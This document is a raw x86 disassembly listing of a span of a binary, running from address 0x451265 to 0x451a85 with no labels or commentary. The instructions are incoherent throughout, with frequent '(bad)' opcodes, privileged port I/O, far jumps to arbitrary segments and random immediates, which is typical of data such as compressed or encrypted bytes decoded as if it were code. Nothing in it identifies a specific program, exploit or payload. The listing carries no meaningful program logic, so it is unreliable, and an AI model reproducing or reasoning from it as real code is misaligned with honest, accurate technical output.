  451265:	pop    es
  451266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451267:	push   0x83ac05aa
  45126c:	es jle 0x4512ed
  45126f:	clc    
  451270:	mov    ebx,DWORD PTR [ecx+ebx*2]
  451273:	xchg   DWORD PTR [ebx+0x53],ebx
  451276:	pushf  
  451277:	cmc    
  451278:	mov    BYTE PTR [ecx+0x5be85b85],dl
  45127e:	or     al,0xfc
  451280:	pop    DWORD PTR ds:0x36b223ba
  451286:	and    BYTE PTR [edi-0x1a9f898d],dh
  45128c:	addr16 inc ebp
  45128e:	(bad)  
  45128f:	fadd   DWORD PTR [eax]
  451291:	dec    esp
  451292:	aaa    
  451293:	dec    ebx
  451294:	or     cl,BYTE PTR [ebx+0x70]
  451297:	(bad)  
  451298:	xchg   ebp,eax
  451299:	add    eax,0x11d7a461
  45129e:	aam    0x1d
  4512a0:	mov    BYTE PTR [edi+0x176962ed],bh
  4512a6:	daa    
  4512a7:	mov    esi,DWORD PTR [esi+0x22]
  4512aa:	aaa    
  4512ab:	xlat   BYTE PTR ds:[ebx]
  4512ac:	jp     0x451256
  4512ae:	rcl    DWORD PTR [ecx+0x304da449],0x89
  4512b5:	pop    ebp
  4512b6:	xor    ebx,esp
  4512b8:	xor    BYTE PTR [ebp+0x21],bh
  4512bb:	lea    esi,[ebx]
  4512bd:	add    esi,DWORD PTR [eax+0x2ab08e9e]
  4512c3:	in     eax,0xc2
  4512c5:	enter  0x791f,0x82
  4512c9:	jp     0x4512c7
  4512cb:	mov    WORD PTR [esp+ecx*1-0x63f22b18],es
  4512d2:	out    0xd,eax
  4512d4:	xchg   esi,eax
  4512d5:	mov    WORD PTR [edx],gs
  4512d7:	push   esi
  4512d8:	mov    al,0x2f
  4512da:	sbb    eax,0x567108eb
  4512df:	mov    al,0x78
  4512e1:	mov    eax,0x30b5d5c4
  4512e6:	sbb    DWORD PTR [edx+ebx*1-0x76130bc7],edi
  4512ed:	popf   
  4512ee:	pop    ds
  4512ef:	in     al,0xc0
  4512f1:	mov    ds:0x2ff2094,al
  4512f6:	sbb    al,0x72
  4512f8:	dec    ebx
  4512f9:	jle    0x45133b
  4512fb:	push   ebx
  4512fc:	dec    ebx
  4512fd:	sti    
  4512fe:	pusha  
  4512ff:	mov    edi,0x96678990
  451304:	inc    esi
  451305:	cmp    cl,BYTE PTR [ecx-0x43]
  451308:	clc    
  451309:	test   al,0xf3
  45130b:	out    dx,eax
  45130c:	popf   
  45130d:	int    0x6e
  45130f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451310:	inc    esp
  451311:	pushf  
  451312:	pop    ds
  451313:	in     al,0x49
  451315:	shr    DWORD PTR ds:0x500216d0,0xf1
  45131c:	cdq    
  45131d:	inc    ebx
  45131e:	ins    DWORD PTR es:[edi],dx
  45131f:	sti    
  451320:	ficomp DWORD PTR [ebp-0x7e1426a6]
  451326:	loopne 0x45130d
  451328:	mov    ah,0xe3
  45132a:	mov    BYTE PTR [ebp-0x1de27533],ch
  451330:	jb     0x451334
  451332:	dec    eax
  451333:	or     al,0x64
  451335:	xor    al,dh
  451337:	lahf   
  451338:	mov    bh,0x2b
  45133a:	ins    BYTE PTR es:[edi],dx
  45133b:	jg     0x451381
  45133d:	inc    edi
  45133e:	stos   DWORD PTR es:[edi],eax
  45133f:	pop    eax
  451340:	leave  
  451341:	adc    eax,0x4332c1
  451346:	cli    
  451347:	into   
  451348:	xor    BYTE PTR [eax-0x66d800f7],al
  45134e:	dec    ebx
  45134f:	aam    0xfa
  451351:	sbb    al,0xac
  451353:	imul   eax,DWORD PTR [esi+0x2999ed5f],0xffffffe0
  45135a:	pusha  
  45135b:	fild   WORD PTR [eax+0x33]
  45135e:	into   
  45135f:	rol    ah,cl
  451361:	add    DWORD PTR [ebx],eax
  451363:	sbb    cl,al
  451365:	lea    edx,[ebp+0x270ed996]
  45136b:	bound  ebp,QWORD PTR [ecx+0x5]
  45136e:	pusha  
  45136f:	or     edi,DWORD PTR [edi]
  451371:	mov    BYTE PTR [ecx+0x34],cl
  451374:	jbe    0x451326
  451376:	dec    ebp
  451377:	aad    0x1a
  451379:	test   al,0x81
  45137b:	int3   
  45137c:	into   
  45137d:	std    
  45137e:	leave  
  45137f:	sbb    DWORD PTR [eax-0x6aa0fb5f],ecx
  451385:	les    esp,FWORD PTR [ecx+0x620316fe]
  45138b:	or     ch,BYTE PTR [ecx]
  45138d:	jmp    0xf63cc39c
  451392:	outs   dx,BYTE PTR ds:[esi]
  451393:	(bad)  
  451394:	xor    ebx,ebx
  451396:	xchg   ebp,eax
  451397:	mov    esp,0x456dab0e
  45139c:	or     ah,BYTE PTR [ebp+0x4f]
  45139f:	aad    0x22
  4513a1:	int    0xf9
  4513a3:	loope  0x4513b3
  4513a5:	pusha  
  4513a6:	sar    DWORD PTR [ecx+ecx*4+0x6ef7ae8f],0x63
  4513ae:	dec    ecx
  4513af:	sahf   
  4513b0:	mov    ebx,0xe450ee02
  4513b5:	mov    esi,0x288befa5
  4513ba:	ins    DWORD PTR es:[edi],dx
  4513bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4513bc:	stc    
  4513bd:	(bad)  
  4513be:	hlt    
  4513bf:	mov    BYTE PTR [ebp+0x525a9202],dh
  4513c5:	stos   DWORD PTR es:[edi],eax
  4513c6:	call   ebp
  4513c8:	push   cs
  4513c9:	and    BYTE PTR [eax+0x5e27dacb],bh
  4513cf:	int3   
  4513d0:	mov    BYTE PTR [ebp+0x6f],ah
  4513d3:	xchg   BYTE PTR [esi],dh
  4513d5:	mov    DWORD PTR [ebx-0x2be0094d],esi
  4513db:	rol    DWORD PTR [esi-0x69],cl
  4513de:	mov    al,0xda
  4513e0:	dec    ecx
  4513e1:	imul   edx,DWORD PTR [eax+0x386ff197],0xd74ee3d7
  4513eb:	dec    ebx
  4513ec:	mov    edx,DWORD PTR es:[edx]
  4513ef:	shr    DWORD PTR [edx-0x6b],1
  4513f2:	imul   esp,DWORD PTR [ebx-0x3b8496f2],0x2d1f58d7
  4513fc:	rol    esi,0x4b
  4513ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451400:	lds    esi,FWORD PTR [edi-0x7bfa67a]
  451406:	pusha  
  451407:	fcomp  DWORD PTR [edi+ecx*1-0x53]
  45140b:	xor    al,0x37
  45140d:	pop    eax
  45140e:	mov    edi,0x3dfb89a0
  451413:	adc    dh,BYTE PTR [eax+0x31b49acb]
  451419:	add    ah,BYTE PTR [esi+0x514d3c4b]
  45141f:	lods   al,BYTE PTR ds:[esi]
  451420:	mov    dl,0x5c
  451422:	mov    esi,0x7ccf56c9
  451427:	dec    ebp
  451428:	in     eax,dx
  451429:	add    ch,BYTE PTR [edx-0x5e]
  45142c:	div    BYTE PTR [edi-0xd184f52]
  451432:	mov    edi,0x2cd78832
  451437:	(bad)  
  451438:	fisttp QWORD PTR [edx]
  45143a:	retf   
  45143b:	sub    DWORD PTR [ebp-0x5dba9dfe],0x6a
  451442:	or     ah,BYTE PTR [edx-0x6e9d451b]
  451448:	loop   0x451414
  45144a:	mov    dh,0x55
  45144c:	mov    DWORD PTR [edi+eiz*1+0x32024dd1],ebp
  451453:	or     eax,0xd17a5711
  451458:	dec    BYTE PTR [edx+0x5ed9a31f]
  45145e:	add    eax,0xcedf6c09
  451463:	aam    0xe6
  451465:	and    ebx,edx
  451467:	popf   
  451468:	jmp    0x7fed:0x8d46fecd
  45146f:	sub    eax,0x1559bd78
  451474:	test   BYTE PTR [eax],al
  451476:	mov    ecx,edx
  451478:	(bad)  
  45147a:	xchg   edx,eax
  45147b:	test   ebp,0x31801f42
  451481:	mov    ebx,0x6b885244
  451486:	clc    
  451487:	jle    0x451485
  451489:	lea    esp,[esi]
  45148b:	sahf   
  45148c:	push   0xc
  45148e:	push   ebx
  45148f:	aam    0x74
  451491:	or     al,0x8
  451493:	call   0xf054ffdf
  451498:	mov    DWORD PTR [edi],esi
  45149a:	cmp    esi,esp
  45149c:	std    
  45149d:	imul   edi,DWORD PTR [ebx-0x51fa392f],0xffffff8c
  4514a4:	sub    DWORD PTR [ecx],0x2b
  4514a7:	fisubr WORD PTR [edi]
  4514a9:	dec    edi
  4514aa:	dec    ebx
  4514ab:	jmp    0x451441
  4514ad:	repz pusha 
  4514af:	outs   dx,DWORD PTR ds:[esi]
  4514b0:	ret    0x6876
  4514b3:	xchg   esi,eax
  4514b4:	mov    edx,0x57b144d
  4514b9:	add    esi,DWORD PTR [ebx]
  4514bb:	dec    esp
  4514bc:	(bad)  
  4514bd:	sahf   
  4514be:	mov    ch,0x9b
  4514c0:	mov    BYTE PTR ds:0xf70f0b93,ch
  4514c6:	adc    BYTE PTR [ecx-0x1a9fd00b],0xf0
  4514cd:	xor    al,0x1e
  4514cf:	push   ebp
  4514d0:	retf   
  4514d1:	xlat   BYTE PTR ds:[ebx]
  4514d2:	adc    BYTE PTR ds:[ecx-0x77c7c86f],dh
  4514d9:	std    
  4514da:	popf   
  4514db:	or     eax,0xd5d86ae6
  4514e0:	imul   ebp,eax,0x736a2b58
  4514e6:	or     eax,0x1d31898a
  4514eb:	lar    eax,WORD PTR [esi+0x3d8316c6]
  4514f2:	push   esi
  4514f3:	or     ah,ch
  4514f5:	loopne 0x451557
  4514f7:	iret   
  4514f8:	scas   eax,DWORD PTR es:[edi]
  4514f9:	adc    BYTE PTR [edx],0x31
  4514fc:	push   ss
  4514fd:	jns    0x451522
  4514ff:	push   ebp
  451500:	fs mov bh,0xd0
  451503:	test   DWORD PTR [bx+si],eax
  451506:	push   cs
  451507:	fadd   st(4),st
  451509:	outs   dx,BYTE PTR ds:[esi]
  45150a:	mov    ah,0xa0
  45150c:	adc    BYTE PTR [ecx+0x78],cl
  45150f:	aam    0xa8
  451511:	pop    esi
  451512:	popa   
  451513:	jg     0x4514fe
  451515:	call   0x634ef0f9
  45151a:	shl    DWORD PTR [ecx],0x78
  45151d:	lea    ebp,[ebx-0x2c]
  451520:	fucomp st(7)
  451522:	loop   0x451511
  451524:	mov    esp,DWORD PTR [eax+0x4b]
  451527:	std    
  451528:	jne    0x451525
  45152a:	pusha  
  45152b:	imul   edx,DWORD PTR [edx+ecx*2-0x6d],0x2f
  451530:	out    dx,al
  451531:	std    
  451532:	out    0xaa,eax
  451534:	adc    BYTE PTR [eax+0x76],cl
  451537:	xchg   edx,eax
  451538:	push   esi
  451539:	fucomp st(6)
  45153b:	adc    cl,BYTE PTR [eax+0x7eee5044]
  451541:	fstp   st(6)
  451543:	xor    al,0x53
  451545:	cs test al,0x2b
  451548:	xchg   BYTE PTR [edi],ch
  45154a:	dec    esi
  45154b:	test   edx,0x3bbd82e8
  451551:	and    ah,dh
  451553:	or     BYTE PTR [ebp+0x7cc23248],dh
  451559:	jae    0x451579
  45155b:	push   edi
  45155c:	repz push 0x580af12e
  451562:	jnp    0x45156d
  451564:	cmp    ecx,DWORD PTR [edi-0x3e]
  451567:	push   esp
  451568:	fs dec ebx
  45156a:	(bad)  
  45156b:	shufps xmm3,XMMWORD PTR [ebp-0x4c],0xf3
  451570:	add    bh,BYTE PTR es:[edi+edx*4]
  451574:	loopne 0x4515b5
  451576:	sbb    BYTE PTR [ecx-0x77],0xcf
  45157a:	xchg   ebx,eax
  45157b:	cdq    
  45157c:	add    bh,BYTE PTR [ebx]
  45157e:	jnp    0x4515a9
  451580:	push   ebx
  451581:	add    dl,BYTE PTR [esi-0x44]
  451584:	out    dx,al
  451585:	div    BYTE PTR [eax+0x370b36c6]
  45158b:	push   ebp
  45158c:	ins    BYTE PTR es:[edi],dx
  45158d:	and    DWORD PTR [edi],ebx
  45158f:	and    edi,eax
  451591:	das    
  451592:	and    esp,ebp
  451594:	in     al,0x36
  451596:	mov    dl,0xd4
  451598:	es aam 0xdb
  45159b:	fidivr DWORD PTR [edi]
  45159d:	lods   al,BYTE PTR ds:[si]
  45159f:	xchg   ebp,eax
  4515a0:	shl    DWORD PTR [ecx-0x6d],0x5e
  4515a4:	mov    BYTE PTR [ebx-0x3c],dh
  4515a7:	aaa    
  4515a8:	test   al,0x51
  4515aa:	or     bh,BYTE PTR [ebx+0x661bddf8]
  4515b0:	or     ebp,ecx
  4515b2:	dec    eax
  4515b3:	adc    BYTE PTR [ecx+0x519f9bd9],0x3
  4515ba:	sub    al,0x6b
  4515bc:	test   eax,0xb6961087
  4515c1:	add    bl,BYTE PTR [edx-0x24b0bab7]
  4515c7:	dec    eax
  4515c8:	ins    BYTE PTR es:[edi],dx
  4515c9:	and    BYTE PTR [esi],bl
  4515cb:	popa   
  4515cc:	fs jl  0x451615
  4515cf:	sbb    al,0xe3
  4515d1:	in     eax,dx
  4515d2:	pop    ecx
  4515d3:	inc    ecx
  4515d4:	or     al,BYTE PTR [edi+0x2905831f]
  4515da:	fdivr  DWORD PTR [edx]
  4515dc:	pop    ecx
  4515dd:	rol    DWORD PTR [eax-0x66],1
  4515e0:	(bad)  
  4515e1:	adc    ecx,DWORD PTR [ebx+edx*8-0x5a]
  4515e5:	stos   BYTE PTR es:[edi],al
  4515e6:	in     eax,0x1b
  4515e8:	push   es
  4515e9:	pusha  
  4515ea:	fst    st(5)
  4515ec:	scas   al,BYTE PTR es:[edi]
  4515ed:	jle    0x4515fe
  4515ef:	sub    al,0x48
  4515f1:	ret    0x4464
  4515f4:	ss inc ebp
  4515f6:	pushf  
  4515f7:	aas    
  4515f8:	lgdtd  [ecx+edi*1]
  4515fc:	inc    edx
  4515fd:	sub    esp,edi
  4515ff:	sbb    eax,0x181dda42
  451604:	mov    BYTE PTR ds:0x5ae3b5ce,cl
  45160a:	add    al,0x96
  45160d:	pop    ds
  45160e:	and    al,0x5e
  451610:	cld    
  451611:	inc    ebp
  451612:	popa   
  451613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451614:	aaa    
  451615:	inc    ebx
  451616:	and    DWORD PTR [ecx],esp
  451618:	sbb    ecx,DWORD PTR [edi]
  45161a:	pusha  
  45161b:	adc    DWORD PTR ds:0x96a16669,edx
  451621:	sbb    DWORD PTR [ebx+0x38204ed4],ebp
  451627:	out    0x46,al
  451629:	pop    esi
  45162a:	mov    edi,0xa82d8b7e
  45162f:	(bad)  
  451631:	xor    DWORD PTR [edx+0x2c33604f],ebx
  451637:	mov    ch,0xf1
  451639:	jl     0x451601
  45163b:	in     eax,0xc8
  45163d:	out    0x4f,eax
  45163f:	mov    esi,0xb55666a8
  451644:	(bad)  
  451645:	jge    0x451665
  451647:	(bad)  
  451648:	ror    BYTE PTR [edi-0x54],1
  45164b:	outs   dx,DWORD PTR ds:[esi]
  45164c:	repz sub al,0x1a
  45164f:	pop    ebx
  451650:	cmp    al,0x69
  451652:	pop    ds
  451653:	mov    ds:0x262fc6ab,al
  451658:	jbe    0x45161c
  45165a:	pop    ds
  45165b:	xor    eax,0xf7cabf8a
  451660:	or     DWORD PTR [esi],edi
  451662:	push   eax
  451663:	test   DWORD PTR [ebx+0x2],0xe280e77a
  45166a:	clc    
  45166b:	sbb    BYTE PTR [ecx+edx*2+0x1e],0xdf
  451670:	(bad)  
  451671:	push   cs
  451672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451673:	icebp  
  451674:	les    ebp,FWORD PTR [ebx-0x63]
  451677:	aam    0xc
  451679:	fidiv  WORD PTR [esi]
  45167b:	add    al,0x76
  45167d:	aam    0xa2
  45167f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451680:	scas   eax,DWORD PTR es:[edi]
  451681:	aaa    
  451682:	xchg   DWORD PTR [ebx-0x7e44c478],ebx
  451688:	ficom  DWORD PTR [eax+0xe]
  45168b:	xlat   BYTE PTR ds:[ebx]
  45168c:	repz or ch,BYTE PTR [ecx-0x39dcd025]
  451693:	jb     0x45170e
  451695:	int    0x7c
  451697:	mov    edi,0xd40c2426
  45169c:	jp     0x451661
  45169e:	retf   
  45169f:	push   0xffffff80
  4516a1:	dec    eax
  4516a2:	int3   
  4516a3:	jbe    0x4516d2
  4516a5:	add    DWORD PTR [ebp-0x31a06f4e],0xffffffba
  4516ac:	push   eax
  4516ad:	test   eax,0x3accfd1f
  4516b2:	jae    0x4516d8
  4516b4:	call   0xaae043de
  4516b9:	xchg   ecx,eax
  4516ba:	pop    ebx
  4516bb:	aam    0x7f
  4516bd:	inc    esp
  4516be:	sbb    ebx,DWORD PTR [esi-0x2d]
  4516c1:	cwde   
  4516c2:	frstorw [ebp-0x58]
  4516c6:	enter  0x68f8,0x23
  4516ca:	imul   eax,edx,0xf3180306
  4516d0:	imul   eax,esi,0xdbe1aad0
  4516d6:	shl    bh,0x5
  4516d9:	stc    
  4516da:	pop    ebp
  4516db:	std    
  4516dc:	fadd   DWORD PTR [ebp+0x1f]
  4516df:	cdq    
  4516e0:	pop    esp
  4516e1:	ret    
  4516e2:	retfw  
  4516e4:	sahf   
  4516e5:	cmc    
  4516e6:	rcl    ecx,cl
  4516e8:	adc    DWORD PTR [ebx],edi
  4516ea:	retf   
  4516eb:	int3   
  4516ec:	call   0x4c33f79a
  4516f1:	retf   
  4516f2:	sub    bp,di
  4516f5:	(bad)  
  4516f6:	or     eax,0xc962fa02
  4516fb:	mov    ecx,0xd46ae98e
  451700:	inc    esp
  451701:	rcr    BYTE PTR [esi],cl
  451703:	div    ecx
  451705:	adc    al,BYTE PTR [ebx+ecx*2+0x3f1f6468]
  45170c:	xor    BYTE PTR [ebx+0x777c3809],dh
  451712:	pop    eax
  451713:	aam    0x3f
  451715:	xchg   ebp,eax
  451716:	test   BYTE PTR ds:0x16c4406b,cl
  45171c:	xchg   esi,eax
  45171d:	mov    ds:0x835dfa23,eax
  451722:	ret    0xbab6
  451725:	sbb    DWORD PTR [esi-0x2c],ecx
  451728:	daa    
  451729:	or     DWORD PTR [ecx],ebp
  45172b:	or     bl,BYTE PTR [edi]
  45172d:	push   esp
  45172e:	fist   WORD PTR [edi-0x5c]
  451731:	daa    
  451732:	and    ebx,DWORD PTR [bx+0x2c3b]
  451737:	xlat   BYTE PTR ds:[ebx]
  451738:	xchg   al,al
  45173a:	jmp    0x45178c
  45173c:	rol    BYTE PTR ds:0xbff3da0,1
  451742:	mov    edi,0x65fd71a1
  451747:	lods   eax,DWORD PTR ds:[esi]
  451748:	and    esi,DWORD PTR ds:0x93322822
  45174e:	xchg   BYTE PTR [ebx-0x5e],cl
  451751:	inc    edi
  451752:	xor    BYTE PTR [ebx-0x3e],dl
  451755:	mov    esp,0x572bd5a9
  45175a:	mov    eax,esi
  45175c:	shl    DWORD PTR [ecx+ebp*2],1
  45175f:	pop    ss
  451760:	test   al,0x57
  451762:	out    dx,eax
  451763:	mov    ds:0xa3048d09,eax
  451768:	scas   al,BYTE PTR es:[edi]
  451769:	add    cl,BYTE PTR [edx-0x1c41c93]
  45176f:	es rcl ebp,0x1f
  451773:	pop    ebp
  451774:	jmp    0x45172f
  451776:	dec    DWORD PTR [edi]
  451778:	lods   al,BYTE PTR ds:[esi]
  451779:	adc    dl,0xd4
  45177c:	jmp    0xd92685fe
  451781:	in     al,0x6e
  451783:	add    eax,0xf738cd8b
  451788:	int    0x9
  45178a:	xchg   edi,eax
  45178b:	icebp  
  45178c:	enter  0xa2c5,0xd4
  451790:	call   0xa54e:0x36e46fdc
  451797:	jle    0xd796609a
  45179d:	sbb    BYTE PTR [edx],dl
  45179f:	xlat   BYTE PTR ds:[ebx]
  4517a0:	test   DWORD PTR [ecx+edi*4],esi
  4517a3:	lds    edi,FWORD PTR [eax-0xd7db5]
  4517a9:	add    bh,BYTE PTR [ecx-0x13]
  4517ac:	and    bh,bl
  4517ae:	scas   eax,DWORD PTR es:[edi]
  4517af:	pop    edx
  4517b0:	mov    bh,ah
  4517b2:	jb     0x451736
  4517b4:	jl     0x451756
  4517b6:	int    0x8
  4517b8:	lds    esi,FWORD PTR [eax+eiz*8]
  4517bb:	jmp    0xbebd:0xd41ef2b0
  4517c2:	xchg   esi,eax
  4517c3:	arpl   WORD PTR [eax+0x39d48bdc],di
  4517c9:	pop    esp
  4517ca:	mov    edx,0x9ed682e5
  4517cf:	push   ss
  4517d0:	mov    BYTE PTR [ebp+0x6f],cl
  4517d3:	mov    edi,0x2d1cebcc
  4517d8:	cmp    al,0x36
  4517da:	pop    esp
  4517db:	mov    DWORD PTR [edx],esi
  4517dd:	add    BYTE PTR [edx],cl
  4517df:	cmovs  eax,DWORD PTR [esi+0x5d41c4a5]
  4517e6:	push   ds
  4517e7:	in     eax,dx
  4517e8:	and    eax,0x629c4420
  4517ed:	in     al,dx
  4517ee:	adc    BYTE PTR [ebp+0x21c453f6],dl
  4517f4:	loop   0x451778
  4517f6:	call   edx
  4517f8:	sbb    al,BYTE PTR [ecx-0x55]
  4517fb:	dec    ebx
  4517fc:	pop    eax
  4517fd:	ret    
  4517fe:	inc    edi
  4517ff:	jge    0x451789
  451801:	adc    ebp,DWORD PTR [ebp-0xda5ecef]
  451807:	psadbw mm0,QWORD PTR [edx]
  45180a:	xchg   esp,eax
  45180b:	add    ah,BYTE PTR [ecx-0x2a]
  45180e:	popa   
  45180f:	sub    ah,al
  451811:	push   edi
  451812:	pop    ds
  451813:	and    eax,ecx
  451815:	mov    dh,0x4e
  451817:	call   0xd3a15874
  45181c:	push   edi
  45181d:	sbb    eax,0xd28b156b
  451822:	jo     0x4517e8
  451824:	loope  0x4517ee
  451826:	sbb    al,0xdb
  451828:	cmp    BYTE PTR ds:0xc27bd1c9,0x7c
  45182f:	mov    DWORD PTR [ebp+0x21d56eef],ebx
  451835:	xchg   edx,eax
  451836:	mov    al,0x34
  451838:	adc    DWORD PTR [ebp+0x15886497],ecx
  45183e:	and    eax,0xb06bb5a9
  451843:	test   eax,0x674cbd88
  451848:	aad    0xcd
  45184a:	sbb    eax,0x8c4a60c1
  45184f:	xchg   ecx,eax
  451850:	pop    ss
  451851:	adc    eax,0x22dcd00a
  451856:	cmc    
  451857:	adc    BYTE PTR [eax+0x65],ch
  45185a:	adc    esp,DWORD PTR fs:[ecx]
  45185d:	cs jl  0x4517f0
  451860:	dec    edx
  451861:	add    al,ch
  451863:	fcmovnb st,st(7)
  451865:	inc    esi
  451866:	cli    
  451867:	sbb    bl,bl
  451869:	leave  
  45186a:	push   ss
  45186b:	xlat   BYTE PTR ds:[ebx]
  45186c:	sub    BYTE PTR [esi+0x213d7c29],ah
  451872:	push   ds
  451873:	das    
  451874:	push   cs
  451875:	push   edx
  451876:	inc    edx
  451877:	(bad)  
  451878:	or     BYTE PTR [ecx],dh
  45187a:	dec    esi
  45187b:	lock sub DWORD PTR ds:0x2caf7d86,edi
  451882:	and    al,0x35
  451884:	push   0xe5056004
  451889:	retf   0xad52
  45188c:	fsub   DWORD PTR [edi-0x5f]
  45188f:	aad    0x42
  451891:	rcr    DWORD PTR [esi+ebx*8+0xf],1
  451895:	sub    al,0x26
  451897:	mov    DWORD PTR [ecx+0x3c],esi
  45189a:	pop    esp
  45189b:	cmp    DWORD PTR [edx],ebx
  45189d:	adc    al,0xe0
  45189f:	dec    eax
  4518a0:	aaa    
  4518a1:	add    esi,DWORD PTR [ebx]
  4518a3:	popf   
  4518a4:	addr16 dec ecx
  4518a6:	pop    ds
  4518a7:	jmp    0x9a27:0xd7360796
  4518ae:	je     0x4518d4
  4518b0:	cmp    ah,BYTE PTR [edx+0x1789bf51]
  4518b6:	jg     0x4518e1
  4518b8:	mov    ch,0x93
  4518ba:	push   edi
  4518bb:	and    eax,DWORD PTR [esi+0x1d]
  4518be:	mov    BYTE PTR [esi],dh
  4518c0:	or     BYTE PTR [edx+0x4a],bh
  4518c3:	mov    ebx,0xc56ad6e8
  4518c8:	mov    DWORD PTR [edi-0x1b],edi
  4518cb:	aad    0x1b
  4518cd:	mov    ebp,0x24cb0394
  4518d2:	sahf   
  4518d3:	lods   eax,DWORD PTR ds:[esi]
  4518d4:	mov    ebp,0x519cdf51
  4518d9:	jae    0x4518e2
  4518db:	(bad)  
  4518dc:	jge    0x4518b9
  4518de:	pusha  
  4518df:	repz sbb BYTE PTR [ecx],cl
  4518e2:	addr16 addr16 jle 0x4518eb
  4518e6:	(bad)  
  4518e8:	mov    eax,ds:0x540be500
  4518ed:	and    BYTE PTR [edi-0x3ae796d],dh
  4518f3:	call   0x8263:0xe1de66f1
  4518fa:	xchg   esp,eax
  4518fb:	and    al,0x44
  4518fd:	push   0x33fbf5c
  451902:	or     eax,ebp
  451904:	imul   ecx,DWORD PTR [edi+eax*4+0xffe6d25],0xef5348fc
  45190f:	xchg   ebp,eax
  451910:	loop   0x451921
  451912:	pop    ds
  451913:	jae    0x451942
  451915:	retf   
  451916:	cmp    ch,bh
  451918:	dec    eax
  451919:	pushf  
  45191a:	xlat   BYTE PTR ss:[ebx]
  45191c:	mov    al,ds:0x2892c680
  451921:	jle    0x451909
  451923:	test   al,0x88
  451925:	mov    cl,0x82
  451927:	mov    edx,0xa6dc54a
  45192c:	jb     0x45194b
  45192e:	xabort 0x60
  451931:	xchg   ecx,eax
  451932:	shl    BYTE PTR ds:0x409626a8,1
  451938:	(bad)  
  451939:	sti    
  45193a:	jp     0x4518ea
  45193c:	mov    WORD PTR [edx+0x29],es
  45193f:	ins    BYTE PTR es:[di],dx
  451941:	jl     0x451979
  451943:	aam    0xda
  451945:	rcr    BYTE PTR [ebx-0x63],0xeb
  451949:	push   0x9588e74a
  45194e:	das    
  45194f:	add    eax,0x271bdc9e
  451954:	lea    eax,ds:0x3150e004
  45195a:	shl    bl,cl
  45195c:	adc    DWORD PTR [edi-0x111746a0],ebx
  451962:	and    ch,BYTE PTR [ebx+0x5a]
  451965:	inc    ebp
  451966:	into   
  451967:	aad    0x2f
  451969:	xchg   edi,eax
  45196a:	push   ebx
  45196b:	mov    ss,WORD PTR [esi-0x7610a4dd]
  451971:	retf   
  451972:	inc    edx
  451973:	jg     0x451926
  451975:	cmp    dh,BYTE PTR [edx-0x37fd0726]
  45197b:	stc    
  45197c:	cwde   
  45197d:	pushf  
  45197e:	test   bl,cl
  451980:	into   
  451981:	pop    eax
  451982:	pop    ds
  451983:	jmp    0xdd54d671
  451988:	push   esi
  451989:	sahf   
  45198a:	(bad)  
  45198b:	aam    0x8
  45198d:	sbb    bh,dh
  45198f:	jo     0x45195c
  451991:	loop   0x451919
  451993:	ror    DWORD PTR [eax-0x4c20a809],0x41
  45199a:	add    BYTE PTR [eax-0x59],cl
  45199d:	inc    edi
  45199e:	inc    esp
  45199f:	and    DWORD PTR [ecx+0x1d3df485],0xffffffd9
  4519a6:	mov    cl,0xbb
  4519a8:	cmp    al,cl
  4519aa:	and    edx,esp
  4519ac:	sub    edx,DWORD PTR [esi+0x2762e8ed]
  4519b2:	xor    esp,edx
  4519b4:	xor    al,0xac
  4519b6:	mov    WORD PTR ds:0x40dde6f8,fs
  4519bc:	or     BYTE PTR [ecx+0x4c],0xd6
  4519c0:	jbe    0x451989
  4519c2:	pusha  
  4519c3:	jb     0x451957
  4519c5:	fcomp  QWORD PTR [eax+0x25c2c2d5]
  4519cb:	push   esi
  4519cc:	sbb    cl,al
  4519ce:	mov    dl,0xc9
  4519d0:	mov    BYTE PTR [ecx-0x49a5abe9],dl
  4519d6:	cmp    ch,ch
  4519d8:	xchg   ebx,eax
  4519d9:	xchg   edx,eax
  4519da:	push   ebp
  4519db:	cmp    cl,BYTE PTR [eax-0x24299ced]
  4519e1:	mov    edx,0x5882293
  4519e6:	pop    edi
  4519e7:	ja     0x451a24
  4519e9:	cli    
  4519ea:	jg     0x451a5c
  4519ec:	lods   eax,DWORD PTR ds:[esi]
  4519ed:	add    eax,0xb758aa86
  4519f2:	shr    DWORD PTR [ebx-0x1b183d7],0x89
  4519f9:	(bad)  
  4519fa:	pop    ss
  4519fb:	mov    ds:0x22cdf458,al
  451a00:	fld    DWORD PTR [edx]
  451a02:	loop   0x451990
  451a04:	cmp    DWORD PTR [ebx+0x61],0xffffff94
  451a08:	in     al,0x91
  451a0a:	jno    0x451a3f
  451a0c:	cmp    bl,al
  451a0e:	adc    bl,al
  451a10:	xchg   ecx,eax
  451a11:	add    ch,BYTE PTR [edx+0x46]
  451a14:	cmp    al,0x86
  451a16:	fs icebp 
  451a18:	mov    BYTE PTR [ecx+0x44],ch
  451a1b:	lahf   
  451a1c:	dec    ecx
  451a1d:	js     0x451a8c
  451a1f:	mov    ecx,0x26860115
  451a24:	arpl   WORD PTR [eax],bx
  451a26:	sbb    eax,0xcfa2125
  451a2b:	cmp    DWORD PTR [ecx-0x7edfd0f5],ecx
  451a31:	xlat   BYTE PTR ds:[ebx]
  451a32:	cvtps2pd xmm7,xmm6
  451a35:	add    eax,0xcb1b3b2e
  451a3a:	xor    al,0xa2
  451a3c:	test   esi,esp
  451a3e:	push   edx
  451a3f:	and    eax,0x5ba7448e
  451a44:	js     0x4519cd
  451a46:	pop    edi
  451a47:	aad    0x36
  451a49:	mov    ds:0xc7512d29,eax
  451a4e:	pop    eax
  451a4f:	push   ebx
  451a50:	mov    ecx,DWORD PTR [ebp+0x48092ccf]
  451a56:	push   eax
  451a57:	aam    0xe
  451a59:	rol    DWORD PTR [edx],cl
  451a5b:	lds    edi,FWORD PTR [edx]
  451a5d:	add    edi,DWORD PTR [edx-0x3590d545]
  451a63:	cwde   
  451a64:	pop    eax
  451a65:	xchg   edi,eax
  451a66:	pushf  
  451a67:	mov    esp,0xc63ce805
  451a6d:	sub    DWORD PTR [ebp+0x7c3e0b50],esi
  451a73:	fcmovne st,st(4)
  451a75:	add    eax,0xbf0917d4
  451a7a:	dec    edx
  451a7b:	out    0x88,al
  451a7d:	shr    DWORD PTR [ebp-0x1a339e4b],1
  451a83:	sub    esi,DWORD PTR [eax]
  451a85:	in     eax,dx
